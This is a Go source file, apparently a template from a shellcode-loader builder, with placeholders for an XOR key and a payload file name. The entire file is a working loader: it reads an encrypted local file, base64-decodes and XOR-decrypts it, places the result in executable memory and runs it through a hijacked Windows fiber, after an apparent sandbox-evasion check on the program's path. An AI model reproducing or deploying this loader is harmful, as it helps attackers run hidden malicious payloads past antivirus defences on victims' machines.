package Loads

import (
	"encoding/base64"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	ntdll                = syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc         = kernel32.NewProc("VirtualAlloc")
	CreateFiber          = kernel32.NewProc("CreateFiber")
	SwitchToFiber        = kernel32.NewProc("SwitchToFiber")
	ConvertThreadToFiber = kernel32.NewProc("ConvertThreadToFiber")
	RtlMoveMemory        = ntdll.NewProc("RtlMoveMemory")
)

func dummy() {
	var age string
	fmt.Scanln(&age)
}

func Callback(shellcode []byte) {
	var d func()
	d = dummy
	ConvertThreadToFiber.Call(NULL)
	lpFiber, err1, _ := CreateFiber.Call(0x100, (uintptr)(unsafe.Pointer(&d)), NULL)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if lpFiber == NULL {
		fmt.Printf("GLE : %d\n", err1)
		os.Exit(0)
	}

	tgtFuncAddr := (*uintptr)(unsafe.Pointer(lpFiber + uintptr(0xB0)))
	*tgtFuncAddr = addr
	fmt.Println(tgtFuncAddr)
	SwitchToFiber.Call(lpFiber)
}

func XorDecrypt(plaintext []byte, key []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	keyLength := len(key)
	for i, byte := range plaintext {
		keyByte := key[i%keyLength]
		encryptedByte := byte ^ keyByte
		ciphertext[i] = encryptedByte
	}
	return ciphertext
}

func DecryptData(v2 string) []byte {
	key := []byte{{{Key}}}
	v22, _ := base64.StdEncoding.DecodeString(v2)
	v222 := XorDecrypt(v22, key)
	return v222
}

func main() {
	args := os.Args[0]
	if args[10] == 92 && (args[0] == 99 || args[0] == 67) {
		os.Exit(0)
	}

	ciphertext, err := os.ReadFile("{{LOCAL_FILENAME}}")
	if err != nil {
		return
	}
	byteData := DecryptData(string(ciphertext))
	Callback(byteData)
}
